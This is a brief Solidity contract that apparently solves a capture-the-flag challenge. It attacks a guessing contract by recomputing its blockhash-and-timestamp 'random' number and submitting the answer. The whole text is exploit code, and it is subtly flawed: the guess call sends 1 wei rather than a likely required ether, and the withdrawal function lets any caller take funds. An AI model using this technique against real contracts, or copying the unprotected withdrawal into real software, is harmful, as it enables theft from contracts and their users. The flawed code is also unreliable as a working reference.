pragma solidity ^0.4.20;

contract Check {

    address public task;

    function setAddress(address _task) public{
        task = _task;
    } 

    function fanswer() public payable{
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        IGuessTheNewNumberChallenge(task).guess.value(1)(answer);
    }

    function deposit() public payable{
        require(msg.value == 1 ether); 
    }

    function withdrow() public payable{
        msg.sender.transfer(1 ether);
    }
}


interface IGuessTheNewNumberChallenge {

    function guess(uint8 n) external payable;
}